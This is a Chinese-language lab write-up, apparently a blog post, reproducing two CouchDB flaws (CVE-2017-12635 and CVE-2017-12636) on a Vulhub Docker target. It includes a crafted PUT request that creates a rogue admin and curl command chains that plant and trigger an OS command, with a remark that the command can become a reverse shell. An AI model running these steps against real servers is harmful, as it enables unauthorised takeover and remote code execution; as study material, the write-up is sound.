# 前言

CouchDB 是一个开源的面向文档的数据库管理系统，可以通过 RESTful JavaScript Object Notation  (JSON) API  访问。CVE-2017-12635是由于Erlang和JavaScript对JSON解析方式的不同，导致语句执行产生差异性导致的。这个漏洞可以让任意用户创建管理员，属于垂直权限绕过漏洞。

CVE-2017-12636是一个任意命令执行漏洞，我们可以通过config api修改couchdb的配置query_server，这个配置项在设计、执行view的时候将被运行。

**影响版本：**

​	小于 1.7.0 以及小于 2.1.1

# 漏洞复现

## 环境搭建

使用Vulhub的漏洞平台进行复现

![image-20230115162346004](https://static.sechelper.com/img/2023/01/16/aaca903fd1bcb8510cd74d3dbf262e63.png)

`docker-compose up -d`

![image-20230115162901210](https://static.sechelper.com/img/2023/01/16/4fcc85d15a1a78d3adb6b0683503e518.png)

访问http://192.168.52.128:5984/_utils/#login出现如下页面搭建成功

![image-20230115163004477](https://static.sechelper.com/img/2023/01/16/381239fa4fd4ba6264dbe65de78f2c5a.png)

## 测试过程

### CVE-2017-12635

构造创建账户的PUT包

```
PUT /_users/org.couchdb.user:liangban HTTP/1.1
Host: www.0-sec.org:5984
Accept: /
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/json
Content-Length: 104

 {
   "type": "user",
   "name": "liangban",
   "roles": ["_admin"],
   "password": "liangban"
 }
```

![image-20230115165925826](https://static.sechelper.com/img/2023/01/16/8ebbc7e7ff3237e39f13f83d39f6edb6.png)

我们没有admin权限，所以报错forbidden显示只有管理员才能设置Role角色。

绕过role验证：发送包含两个roles的数据包，即可绕过限制

在原先的包中加入 "roles":[],

![image-20230115170628632](https://static.sechelper.com/img/2023/01/16/02b603e39ea326323cf1a1f6620c260a.png)

返回如图所示即成功创建用户

尝试使用liangban/liangban登录：

![image-20230115170859103](https://static.sechelper.com/img/2023/01/16/310a139dab37661be367e6a33284e7ba.png)

成功登录，且为管理员账户

### CVE-2017-12636

该漏洞利用条件需要登录管理员用户触发，可使用上面介绍的CVE-2017-12635搭配利用

由于Couchdb 2.x和和1.x的的API接口有所差别，导致利用方式也不同，这里直接拿刚刚复现的CVE-2017-12635环境，演示2.x版本

Couchdb 2.x 引入了集群，所以修改配置的API需要增加node name,带上账号密码访问`/_membership`获取node名称：

其中liangban:liangban为管理员的账户密码

`curl http://liangban:liangban@192.168.52.128:5984/_membership`

![image-20230115173454056](https://static.sechelper.com/img/2023/01/16/68b50c1b2ec354db0f8783b29ac3940b.png)

这里只有一个node，为：nonode@nohost

修改`nonode@nohost`的配置,其中`id >/tmp/success`是要执行的命令，可以更换为弹shell

```
curl -X PUT http://liangban:liangban@192.168.52.128:5984/_node/nonode@nohost/_config/query_servers/cmd -d '"id >/tmp/success"'
```

![image-20230115174554524](https://static.sechelper.com/img/2023/01/16/be467cbfa0f6f5f926db1a1c5d1f8747.png)

请求添加一个名为zhuAn的Database，以便在里面执行查询

`curl -X PUT 'http://liangban:liangban@192.168.52.128:5984/zhuan'`

![image-20230115180231239](https://static.sechelper.com/img/2023/01/16/3e7ffd1a31759ab8cf1c966c7309f6f4.png)

请求添加一个名为test的Document，以便在里面执行查询

`curl -X PUT 'http://liangban:liangban@192.168.52.128:5984/zhuan/test' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'`

![image-20230115180752378](https://static.sechelper.com/img/2023/01/16/cf0921e028556a01cfc481cda36a3487.png)

Couchdb 2.x删除了`_temp_view`，所以我们为了触发`query_servers`中定义的命令，需要添加一个`_view`：

`curl -X PUT http://liangban:liangban@192.168.52.128:5984/zhuan/_design/test -d  '{"_id":"_design/test","views":{"wooyun":{"map":""} },"language":"cmd"}' -H "Content-Type: application/json"`

![image-20230115194811747](https://static.sechelper.com/img/2023/01/16/44011c9e8ba1010cf2af8ce35d85d191.png)

增加`_view`的同时即触发了`query_servers`中的命令。

看到返回错误信息没有关系，报错来源于执行命令之后的流程

加入靶机的docker查看发现命令执行成功，成功写入success文件

![image-20230115195233436](https://static.sechelper.com/img/2023/01/16/da489f3ceb8dae61bf1d4db9dc6224eb.png)



**1.6.0系列**

`curl -X PUT 'http://liangban:liangban@192.168.52.128:5984/_config/query_servers/cmd' -d '"id >/tmp/success"'`

`curl -X PUT 'http://liangban:liangban@192.168.52.128:5984/zhuan'`

`curl -X PUT 'http://liangban:liangban@192.168.52.128:5984/zhuan/test' -d '{"_id":"770895a97726d5ca6d70a22173005c7b"}'`

`curl -X POST  'http://liangban:liangban@192.168.52.128:5984/zhuan/_temp_view?limit=10'  -d '{"language":"cmd","map":""}' -H 'Content-Type:application/json'`

### exp

要替换对应的网址，端口，监听ip，对应版本，1.x和2.x的payload不一致。

`python3 exp.py`

![image-20230115221117654](https://static.sechelper.com/img/2023/01/16/6c6ee85208f0ccd5dbc929970407bbf7.png)

![image-20230115220615107](https://static.sechelper.com/img/2023/01/16/51a7653be9dff7288ac069e1fc3959c9.png)
